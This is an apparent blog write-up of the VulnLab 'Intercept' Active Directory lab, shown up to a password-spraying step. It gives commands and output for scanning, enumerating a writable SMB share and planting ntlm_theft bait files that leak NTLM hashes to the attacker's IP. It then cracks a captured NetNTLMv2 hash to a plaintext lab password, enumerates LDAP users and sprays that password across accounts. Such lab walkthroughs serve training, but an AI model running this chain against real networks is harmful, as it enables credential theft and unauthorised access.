---
title: "Intercept VulnLab| RBCD & Another word For ESC7"
description: "And here we go again! It’s Maverick, back fromhis dark shadowto drop another Active Directory write-up. At this point, I’ve written so much about ESC7, PetitPotam, and RBCD that they’re basically my t"
pubDate: 2025-03-26
tags: ["Security Research", "Red Team"]
author: "Mohamed Eletrepy (maverick)"
readingTime: 32
coverImage: "https://cdn-images-1.medium.com/max/800/1*bBTg9g7NzemUWRNDFn3Wqg.png"
---

---

![](https://cdn-images-1.medium.com/max/800/1*bBTg9g7NzemUWRNDFn3Wqg.png)

### Intercept VulnLab| RBCD & Another word For ESC7

First Thing: Free Palestine 🇵🇸

![](https://cdn-images-1.medium.com/max/800/0*TRLnp2ZB3iswYIEH.jpeg)

*Free Palestine with every single drop of my blood*

---

And here we go again! It’s Maverick, back from **his dark shadow** to drop another Active Directory write-up. At this point, I’ve written so much about ESC7, PetitPotam, and RBCD that they’re basically my toxic exes I keep coming back no matter what.

If you’re wondering why I love Active Directory so much oh, I *definitely* do! There’s just something about breaking into networks, abusing protocols, and making sysadmins question their career choices that keeps me hooked. Infrastructure hacking? That’s my playground. Web pentesting and routing? Meh, not my thing. But one day, I swear, I’ll write about ICS/SCADA hacking and take things to a whole new level.

But forget all that for now let’s get this write-up rolling! **Are you ready? No? Well, too bad, we’re hacking anyway!**

![](https://cdn-images-1.medium.com/max/800/1*Y_yaf-LA0fudS0Ap6EfdPg.jpeg)

*We don’t break systems; we teach them what they were never prepared to learn.*

#### DC01.intercept.vl

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# nmap -sCV -Pn -oN host1 10.10.186.69  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 16:28 EDT  
Nmap scan report for 10.10.186.69  
Host is up (0.62s latency).  
Not shown: 987 filtered tcp ports (no-response)  
PORT STATE SERVICE VERSION  
53/tcp open domain Simple DNS Plus  
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-24 20:29:12Z)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.intercept.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.intercept.vl  
| Not valid before: 2024-07-17T15:52:02  
|_Not valid after: 2025-07-17T15:52:02  
|_ssl-date: TLS randomness does not represent time  
445/tcp open microsoft-ds?  
464/tcp open kpasswd5?  
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=DC01.intercept.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.intercept.vl  
| Not valid before: 2024-07-17T15:52:02  
|_Not valid after: 2025-07-17T15:52:02  
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.intercept.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.intercept.vl  
| Not valid before: 2024-07-17T15:52:02  
|_Not valid after: 2025-07-17T15:52:02  
|_ssl-date: TLS randomness does not represent time  
3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.intercept.vl  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.intercept.vl  
| Not valid before: 2024-07-17T15:52:02  
|_Not valid after: 2025-07-17T15:52:02  
|_ssl-date: TLS randomness does not represent time  
3389/tcp open ms-wbt-server Microsoft Terminal Services  
|_ssl-date: 2025-03-24T20:30:43+00:00; -1s from scanner time.  
| ssl-cert: Subject: commonName=DC01.intercept.vl  
| Not valid before: 2025-03-23T20:10:17  
|_Not valid after: 2025-09-22T20:10:17  
| rdp-ntlm-info:  
| Target_Name: INTERCEPT  
| NetBIOS_Domain_Name: INTERCEPT  
| NetBIOS_Computer_Name: DC01  
| DNS_Domain_Name: intercept.vl  
| DNS_Computer_Name: DC01.intercept.vl  
| Product_Version: 10.0.20348  
|_ System_Time: 2025-03-24T20:30:06+00:00  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled and required  
| smb2-time:  
| date: 2025-03-24T20:30:05  
|_ start_date: N/A  
|_clock-skew: mean: -1s, deviation: 0s, median: -1s  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 141.69 seconds
```

#### WS01.intercept.vl

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# nmap -sCV -Pn -oN host2 10.10.186.70  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-24 16:23 EDT  
Nmap scan report for 10.10.186.70  
Host is up (0.60s latency).  
Not shown: 995 filtered tcp ports (no-response)  
PORT STATE SERVICE VERSION  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
445/tcp open microsoft-ds?  
3389/tcp open ms-wbt-server Microsoft Terminal Services  
| ssl-cert: Subject: commonName=WS01.intercept.vl  
| Not valid before: 2025-03-23T20:10:47  
|_Not valid after: 2025-09-22T20:10:47  
| rdp-ntlm-info:  
| Target_Name: INTERCEPT  
| NetBIOS_Domain_Name: INTERCEPT  
| NetBIOS_Computer_Name: WS01  
| DNS_Domain_Name: intercept.vl  
| DNS_Computer_Name: WS01.intercept.vl  
| DNS_Tree_Name: intercept.vl  
| Product_Version: 10.0.19041  
|_ System_Time: 2025-03-24T20:24:55+00:00  
|_ssl-date: 2025-03-24T20:25:34+00:00; -2s from scanner time.  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled but not required  
|_clock-skew: mean: -2s, deviation: 0s, median: -2s  
| smb2-time:  
| date: 2025-03-24T20:24:54  
|_ start_date: N/A  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 122.30 seconds
```

As usual with VulnLab, we’ve got an intercept chain featuring two machines: **DC01** and **WS01** — because what’s an AD lab without the classic domain controller and workstation duo? Like any good Active Directory setup, these machines are running **DNS, LDAP, Kerberos, SMB**, and all the other usual suspects. And of course, SMB is calling my name, so that’s where we’re starting.

#### Enumeration SMB Shares

Before diving in, I’ve added both machine IPs to the **hosts** file — because let’s be real, typing out IP addresses every time is a pain. Now, i’s time to fire up **netexec** and start poking around. Let’s get to it!

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# nxc smb hosts  
SMB 10.10.186.69 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)  
SMB 10.10.186.70 445 WS01 [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)  
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

I started by enumerating SMB with `nxc smb hosts`, revealing two machines: **DC01 (10.10.186.69)** running Windows Server 2022 with SMB signing enabled and SMBv1 disabled, and **WS01 (10.10.186.70)** running Windows 10 / Server 2019 with SMB signing disabled and SMBv1 also disabled. The fact that SMB signing is off on WS01 is definitely something to keep in mind, as it could be exploitable later. For now, the recon continues.

Shared files one WS01 ??

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# nxc smb 10.10.186.69 -u test -p '' --shares  
SMB 10.10.186.69 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)  
SMB 10.10.186.69 445 DC01 [-] intercept.vl\test: STATUS_LOGON_FAILURE
```

Next, I attempted to enumerate SMB shares on **DC01 (10.10.186.69)** using a blank password with the user `test`, but it resulted in a `STATUS_LOGON_FAILURE`. No anonymous access here, which means we’ll need valid credentials to proceed further. Since SMB signing is enabled, relay attacks are off the table for now, so it’s time to explore other attack vectors.

Back to WS01

```bash
└─# nxc smb 10.10.186.70 -u mav -p '' --shares  
SMB 10.10.186.70 445 WS01 [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)  
SMB 10.10.186.70 445 WS01 [+] intercept.vl\mav: (Guest)  
SMB 10.10.186.70 445 WS01 [*] Enumerated shares  
SMB 10.10.186.70 445 WS01 Share Permissions Remark  
SMB 10.10.186.70 445 WS01 ----- ----------- ------  
SMB 10.10.186.70 445 WS01 ADMIN$ Remote Admin  
SMB 10.10.186.70 445 WS01 C$ Default share  
SMB 10.10.186.70 445 WS01 dev READ,WRITE shared developer workspace  
SMB 10.10.186.70 445 WS01 IPC$ READ Remote IPC  
SMB 10.10.186.70 445 WS01 Users READ
```

### Exploring the dev Share

Now, this is getting interesting! The **dev** share allows both **read and write** access, which means we might be able to drop files, modify existing ones, or even find some juicy credentials lying around. Time to dig deeper and see what’s hiding inside.

There are plenty of tools to enumerate SMB shares, but I like to keep it **old school** — so I’ll be using **smbclient**. Sometimes, the classics just get the job done. Let’s list the contents and see if this share holds anything useful or if we’re just rummaging through a developer’s digital junk drawer.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# ==smbclient== ==//10.10.186.70/dev/==  
Password for [WORKGROUP\root]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
. D 0 Mon Mar 24 16:35:21 2025  
.. D 0 Mon Mar 24 16:35:21 2025  
projects D 0 Thu Jun 29 07:57:25 2023  
readme.txt A 123 Thu Jun 29 07:44:59 2023  
tools D 0 Thu Jun 29 07:51:17 2023  
  
7834107 blocks of size 4096. 1214683 blocks available  
smb: \> mget *  
Get file readme.txt? y  
getting file \readme.txt of size 123 as readme.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)  
smb: \> cd projects\  
smb: \projects\>  
smb: \projects\> ls  
. D 0 Thu Jun 29 07:57:25 2023  
.. D 0 Thu Jun 29 07:57:25 2023  
kernel_driver D 0 Thu Jun 29 07:57:32 2023  
  
7834107 blocks of size 4096. 1214592 blocks available  
smb: \projects\> cd kernel_driver\  
smb: \projects\kernel_driver\> ls  
. D 0 Thu Jun 29 07:57:32 2023  
.. D 0 Thu Jun 29 07:57:32 2023  
readme.txt A 41 Thu Jun 29 07:57:39 2023  
  
7834107 blocks of size 4096. 1214591 blocks available  
smb: \projects\kernel_driver\> get readme.txt  
getting file \projects\kernel_driver\readme.txt of size 41 as readme.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)  
smb: \projects\kernel_driver\>
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# cat readme.txt  
Please check this share regularly for updates to the application (this is a temporary solution until we switch to gitlab).  
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# ls  
host1 host2 hosts mavscan_results.txt readme.txt  
  
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# cat readme.txt  
Driver still in development, coming soon.
```

### Forcing NTLM Authentication via File Execution

As always in this kind of scenario, the goal is to **coerce NTLM authentication** and capture NTLM hashes. If we can trick the system into authenticating against us, we might get a juicy hash to crack or relay.

To achieve this, I’ll be using **NTLMTheft**, a tool that generates multiple file types capable of triggering authentication requests. The plan is simple:
1. Generate malicious files with different extensions using NTLMTheft.
2. Upload these files to the **dev **share.
3. Run **Responder **on my VPN tunnel IP to intercept any authentication attempts.
Now, let’s generate some files named `mav.<extension>`, drop them into **/dev**, and see what comes knocking on Responder’s door. Time to bait the trap!

1. Generate malicious files with different extensions using NTLMTheft.

```bash
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/ntlm_theft]  
└─# python3 ntlm_theft.py  
usage: ntlm_theft.py --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>  
ntlm_theft.py: error: the following arguments are required: -g/--generate, -s/--server, -f/--filename  
  
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/ntlm_theft]  
└─# python3 ntlm_theft.py -s 10.8.5.124 --generate all --filename mav  
Created: mav/mav.scf (BROWSE TO FOLDER)  
Created: mav/mav-(url).url (BROWSE TO FOLDER)  
Created: mav/mav-(icon).url (BROWSE TO FOLDER)  
Created: mav/mav.lnk (BROWSE TO FOLDER)  
Created: mav/mav.rtf (OPEN)  
Created: mav/mav-(stylesheet).xml (OPEN)  
Created: mav/mav-(fulldocx).xml (OPEN)  
Created: mav/mav.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)  
Created: mav/mav-(includepicture).docx (OPEN)  
Created: mav/mav-(remotetemplate).docx (OPEN)  
Created: mav/mav-(frameset).docx (OPEN)  
Created: mav/mav-(externalcell).xlsx (OPEN)  
Created: mav/mav.wax (OPEN)  
Created: mav/mav.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)  
Created: mav/mav.asx (OPEN)  
Created: mav/mav.jnlp (OPEN)  
Created: mav/mav.application (DOWNLOAD AND OPEN)  
Created: mav/mav.pdf (OPEN AND ALLOW)  
Created: mav/zoom-attack-instructions.txt (PASTE TO CHAT)  
Created: mav/Autorun.inf (BROWSE TO FOLDER)  
Created: mav/desktop.ini (BROWSE TO FOLDER)  
Generation Complete.  
  
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/ntlm_theft]  
└─# ls  
docs LICENSE mav ntlm_theft.py README.md templates  
  
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/ntlm_theft]  
└─# cd mav  
  
┌──(root㉿kali)-[/home/…/vulnlab/intercept/ntlm_theft/mav]  
└─# ls  
Autorun.inf mav.lnk  
desktop.ini mav.m3u  
mav.application mav.pdf  
mav.asx 'mav-(remotetemplate).docx'  
'mav-(externalcell).xlsx' mav.rtf  
'mav-(frameset).docx' mav.scf  
'mav-(fulldocx).xml' 'mav-(stylesheet).xml'  
mav.htm 'mav-(url).url'  
'mav-(icon).url' mav.wax  
'mav-(includepicture).docx' zoom-attack-instructions.txt  
mav.jnlp
```

2. Upload these files to the **dev **share.

```bash
┌──(root㉿kali)-[/home/…/vulnlab/intercept/ntlm_theft/mav]  
└─# smbclient //10.10.186.70/dev/  
Password for [WORKGROUP\root]:  
Try "help" to get a list of possible commands.  
smb: \> prompt off  
smb: \> mput *  
putting file mav.application as \mav.application (1.0 kb/s) (average 1.0 kb/s)  
putting file mav-(remotetemplate).docx as \mav-(remotetemplate).docx (10.3 kb/s) (average 6.5 kb/s)  
putting file zoom-attack-instructions.txt as \zoom-attack-instructions.txt (0.1 kb/s) (average 4.7 kb/s)  
putting file mav.wax as \mav.wax (0.0 kb/s) (average 3.4 kb/s)  
putting file mav-(frameset).docx as \mav-(frameset).docx (5.3 kb/s) (average 3.8 kb/s)  
putting file mav.rtf as \mav.rtf (0.1 kb/s) (average 3.2 kb/s)  
putting file desktop.ini as \desktop.ini (0.0 kb/s) (average 2.8 kb/s)  
putting file Autorun.inf as \Autorun.inf (0.0 kb/s) (average 2.5 kb/s)  
putting file mav.pdf as \mav.pdf (0.4 kb/s) (average 2.3 kb/s)  
putting file mav.asx as \mav.asx (0.1 kb/s) (average 2.0 kb/s)  
putting file mav.htm as \mav.htm (0.0 kb/s) (average 1.8 kb/s)  
putting file mav.m3u as \mav.m3u (0.0 kb/s) (average 1.7 kb/s)  
putting file mav-(stylesheet).xml as \mav-(stylesheet).xml (0.1 kb/s) (average 1.6 kb/s)  
putting file mav.lnk as \mav.lnk (1.0 kb/s) (average 1.5 kb/s)  
putting file mav-(fulldocx).xml as \mav-(fulldocx).xml (30.6 kb/s) (average 3.8 kb/s)  
putting file mav-(icon).url as \mav-(icon).url (0.1 kb/s) (average 3.6 kb/s)  
putting file mav-(externalcell).xlsx as \mav-(externalcell).xlsx (2.6 kb/s) (average 3.5 kb/s)  
putting file mav.jnlp as \mav.jnlp (0.1 kb/s) (average 3.3 kb/s)  
putting file mav-(url).url as \mav-(url).url (0.0 kb/s) (average 3.2 kb/s)  
putting file mav.scf as \mav.scf (0.0 kb/s) (average 3.0 kb/s)  
putting file mav-(includepicture).docx as \mav-(includepicture).docx (5.6 kb/s) (average 3.1 kb/s)
```

![](https://cdn-images-1.medium.com/max/1200/1*2VyRJrIV0PwmMNub93pyJw.png)

### Caught an NTLM Hash — Time to Crack It!

And here we go! We’ve successfully captured an **NTLM hash** for the user **KATHRYN.SPENCER**. Now, it’s time for the fun part **cracking it with Hashcat**.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# hashcat -m 5600 hash_kathryn /usr/share/wordlists/rockyou.txt.gz  
hashcat (v6.2.6) starting  
  
OpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]  
============================================================================================================================================  
* Device #1: cpu-sandybridge-AMD Ryzen 7 4800H with Radeon Graphics, 1435/2934 MB (512 MB allocatable), 4MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory required for this attack: 0 MB  
  
Dictionary cache hit:  
* Filename..: /usr/share/wordlists/rockyou.txt.gz  
* Passwords.: 14344385  
* Bytes.....: 53357329  
* Keyspace..: 14344385  
  
KATHRYN.SPENCER::INTERCEPT:36bfa7f8bab5dbf2:a77f717459050b47dc4aeffb1d85b948:010100000000000000f564bcdd9cdb01a2a04fa27f6eae2800000000020008005a0052004100410001001e00570049004e002d004b005400340047004200390047005900480039004b0004003400570049004e002d004b005400340047004200390047005900480039004b002e005a005200410041002e004c004f00430041004c00030014005a005200410041002e004c004f00430041004c00050014005a005200410041002e004c004f00430041004c000700080000f564bcdd9cdb0106000400020000000800300030000000000000000000000000200000338e3c4fa17ac77105138d5ed5befccb6448dd70f239530683ae053aa1d70e820a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0035002e003100320034000000000000000000:Chocolate1  
  
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 5600 (NetNTLMv2)  
Hash.Target......: KATHRYN.SPENCER::INTERCEPT:36bfa7f8bab5dbf2:a77f717...000000  
Time.Started.....: Mon Mar 24 16:59:50 2025 (1 sec)  
Time.Estimated...: Mon Mar 24 16:59:51 2025 (0 secs)  
Kernel.Feature...: Pure Kernel  
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#1.........: 703.0 kH/s (0.69ms) @ Accel:256 Loops:1 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 59392/14344385 (0.41%)  
Rejected.........: 0/59392 (0.00%)  
Restore.Point....: 58368/14344385 (0.41%)  
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#1....: kruimel -> 062906  
Hardware.Mon.#1..: Util: 18%  
  
Started: Mon Mar 24 16:59:44 2025  
Stopped: Mon Mar 24 16:59:52 2025
```

### Validating Credentials and Expanding Access

Now that we have a valid **username and password**, it’s time to check if we can log in and expand our foothold. First, we’ll verify the credentials against SMB to confirm they work. Then, we’ll take it a step further **collecting more users and spraying the password across different services** like **WinRM and LDAP** to see if we can escalate our access.

Password reuse is a beautiful thing (for attackers, at least), so let’s see if **Kathryn’s password** is shared across multiple accounts. If we get lucky, we might just unlock even more access across the domain. Let’s go hunting!

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# nxc smb hosts -u 'KATHRYN.SPENCER' -p 'Chocolate1'  
SMB 10.10.186.69 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)  
SMB 10.10.186.69 445 DC01 [+] intercept.vl\KATHRYN.SPENCER:Chocolate1  
SMB 10.10.186.70 445 WS01 [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)  
SMB 10.10.186.70 445 WS01 [+] intercept.vl\KATHRYN.SPENCER:Chocolate1  
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00  
  
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# nxc winrm hosts -u 'KATHRYN.SPENCER' -p 'Chocolate1'  
WINRM 10.10.186.69 5985 DC01 [*] Windows Server 2022 Build 20348 (name:DC01) (domain:intercept.vl)  
WINRM 10.10.186.70 5985 WS01 [*] Windows 10 / Server 2019 Build 19041 (name:WS01) (domain:intercept.vl)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
arc4 = algorithms.ARC4(self._key)  
WINRM 10.10.186.69 5985 DC01 [-] intercept.vl\KATHRYN.SPENCER:Chocolate1  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
arc4 = algorithms.ARC4(self._key)  
WINRM 10.10.186.70 5985 WS01 [-] intercept.vl\KATHRYN.SPENCER:Chocolate1  
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00  
  
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# nxc ldap hosts -u 'KATHRYN.SPENCER' -p 'Chocolate1'  
SMB 10.10.186.69 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)  
LDAP 10.10.186.69 389 DC01 [+] intercept.vl\KATHRYN.SPENCER:Chocolate1  
SMB 10.10.186.70 445 NONE [*] x64 (name:) (domain:) (signing:False) (SMBv1:False)  
LDAP 10.10.186.70 389 NONE [-] \KATHRYN.SPENCER:Chocolate1 Error connecting to the domain, are you sure LDAP service is running on the target?  
Error: [Errno 110] Connection timed out  
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00  
  
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# nxc smb hosts -u 'KATHRYN.SPENCER' -p 'Chocolate1' --users  
SMB 10.10.186.70 445 WS01 [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)  
SMB 10.10.186.69 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)  
SMB 10.10.186.70 445 WS01 [+] intercept.vl\KATHRYN.SPENCER:Chocolate1  
SMB 10.10.186.69 445 DC01 [+] intercept.vl\KATHRYN.SPENCER:Chocolate1  
SMB 10.10.186.69 445 DC01 -Username- -Last PW Set- -BadPW- -Description-  
SMB 10.10.186.69 445 DC01 Administrator 2023-06-27 20:08:06 0 Built-in account for administering the computer/domain  
SMB 10.10.186.69 445 DC01 Guest <never> 0 Built-in account for guest access to the computer/domain  
SMB 10.10.186.69 445 DC01 krbtgt 2023-06-27 13:27:18 0 Key Distribution Center Service Account  
SMB 10.10.186.69 445 DC01 Rhys.King 2023-06-27 13:44:50 0  
SMB 10.10.186.69 445 DC01 Kathryn.Spencer 2023-06-29 11:49:36 0  
SMB 10.10.186.69 445 DC01 Dale.King 2023-06-27 13:44:51 0  
SMB 10.10.186.69 445 DC01 Billy.Watson 2023-06-27 13:44:51 0  
SMB 10.10.186.69 445 DC01 Hayley.Jennings 2023-06-27 13:44:51 0  
SMB 10.10.186.69 445 DC01 Vincent.Woods 2023-06-27 14:09:46 0  
SMB 10.10.186.69 445 DC01 Dorothy.Ford 2023-06-27 13:44:51 0  
SMB 10.10.186.69 445 DC01 Simon.Bowen 2023-06-27 13:44:51 0  
SMB 10.10.186.69 445 DC01 Reece.Vaughan 2023-06-27 13:44:51 0  
SMB 10.10.186.69 445 DC01 Louise.Williams 2023-06-27 13:44:51 0  
SMB 10.10.186.69 445 DC01 [*] Enumerated 13 local users: INTERCEPT  
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00 
```

You can use **ldapsearch** to pull a list of users from the domain, which is always a great way to expand our target pool. I think **netexec** also supports LDAP enumeration, but for now, let’s go old school and try **ldapsearch** first. If it works, we’ll have a fresh list of usernames to spray with the password we cracked. Let’s see if Kathryn’s password is the key to more accounts.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# ldapsearch -x -LLL -D 'KATHRYN.SPENCER@intercept.vl' -w 'Chocolate1' -H ldap://10.10.186.69 -b 'DC=intercept,DC=vl' '(objectClass=user)' sAMAccountName | awk -F': ' '/sAMAccountName/ {print $2}'  
  
Administrator  
Guest  
DC01$  
krbtgt  
Rhys.King  
Kathryn.Spencer  
Dale.King  
Billy.Watson  
Hayley.Jennings  
Vincent.Woods  
Dorothy.Ford  
Simon.Bowen  
Reece.Vaughan  
Louise.Williams  
WS01$
```

Now, let’s break it down:

---

### Command Breakdown

🔹 `ldapsearch -x`
 Uses simple authentication.

🔹 `-LLL`
 Produces clean output (removes comments, LDIF version, and continuation lines).

🔹 `-D 'KATHRYN.SPENCER@intercept.vl'`
 Specifies the **Bind DN** (the user account we are authenticating with).

🔹 `-w 'Chocolate1'`
 Provides the password for the Bind DN.

🔹 `-H ldap://10.10.240.133`
 Sets the target **Domain Controller (DC)**.

🔹 `-b 'DC=intercept,DC=vl'`
 Defines the **Base DN**, which is the root of our search in the directory.

🔹 `'(objectClass=user)'`
 Filters results to return only **user objects**.

🔹 `sAMAccountName`
 Requests the **sAMAccountName** attribute, which contains the usernames.

🔹 `awk -F': ' '/sAMAccountName/ {print $2}'`
 Extracts and cleans the usernames from the output.

---

Now that we have usernames, it’s **password spraying time**! Let’s test Kathryn’s password across multiple accounts and see if anyone else shares the same bad habit. We’ll start with **SMB, and LDAP**, hoping for a hit. If we get lucky, our foothold in the network just got stronger. Let’s go!

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# nxc smb 10.10.186.70 -u users.txt -p 'Chocolate1' --continue-on-success  
SMB 10.10.186.70 445 WS01 [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)  
SMB 10.10.186.70 445 WS01 [-] intercept.vl\Administrator:Chocolate1 STATUS_LOGON_FAILURE  
SMB 10.10.186.70 445 WS01 [-] intercept.vl\Guest:Chocolate1 STATUS_LOGON_FAILURE  
SMB 10.10.186.70 445 WS01 [-] intercept.vl\DC01$:Chocolate1 STATUS_LOGON_FAILURE  
SMB 10.10.186.70 445 WS01 [-] intercept.vl\krbtgt:Chocolate1 STATUS_LOGON_FAILURE  
SMB 10.10.186.70 445 WS01 [-] intercept.vl\Rhys.King:Chocolate1 STATUS_LOGON_FAILURE  
SMB 10.10.186.70 445 WS01 [+] intercept.vl\Kathryn.Spencer:Chocolate1  
SMB 10.10.186.70 445 WS01 [-] intercept.vl\Dale.King:Chocolate1 STATUS_LOGON_FAILURE  
SMB 10.10.186.70 445 WS01 [-] Connection Error: Error occurs while reading from remote(104)  
SMB 10.10.186.70 445 WS01 [-] intercept.vl\Hayley.Jennings:Chocolate1 STATUS_LOGON_FAILURE  
SMB 10.10.186.70 445 WS01 [-] intercept.vl\Vincent.Woods:Chocolate1 STATUS_LOGON_FAILURE  
SMB 10.10.186.70 445 WS01 [-] intercept.vl\Dorothy.Ford:Chocolate1 STATUS_LOGON_FAILURE  
SMB 10.10.186.70 445 WS01 [-] intercept.vl\Simon.Bowen:Chocolate1 STATUS_LOGON_FAILURE  
SMB 10.10.186.70 445 WS01 [-] intercept.vl\Reece.Vaughan:Chocolate1 STATUS_LOGON_FAILURE  
SMB 10.10.186.70 445 WS01 [-] intercept.vl\Louise.Williams:Chocolate1 STATUS_LOGON_FAILURE  
SMB 10.10.186.70 445 WS01 [-] intercept.vl\WS01$:Chocolate1 STATUS_LOGON_FAILURE  
SMB 10.10.186.70 445 WS01 [+] intercept.vl\:Chocolate1 (Guest)
```

